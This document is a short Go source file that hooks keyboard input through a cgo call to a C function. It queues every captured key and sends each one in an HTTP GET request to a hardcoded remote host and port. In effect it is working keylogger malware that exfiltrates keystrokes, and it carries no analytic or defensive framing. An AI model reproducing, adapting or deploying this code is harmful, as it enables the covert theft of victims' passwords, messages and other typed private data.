package main

/*
 #include "print.h"
*/
import "C"
import (
	"net/http"
	"strings"
)

var chanBuffer = make(chan string, 100)

//export GoHandleKey
func GoHandleKey(key *C.char) {
	select {
	case chanBuffer <- C.GoString(key):
	default:
	}
}

func handleFunc() {
	for res := range chanBuffer {
		sendKeyToServer(res)
	}
}

func sendKeyToServer(key string) {
	req, _ := http.NewRequest("GET", "http://s1.yumehost.com:25583/", strings.NewReader(key))

	client := &http.Client{}
	_, _ = client.Do(req)
}

func main() {
	defer close(chanBuffer)
	go handleFunc()
	C.printKeyBoard()
}
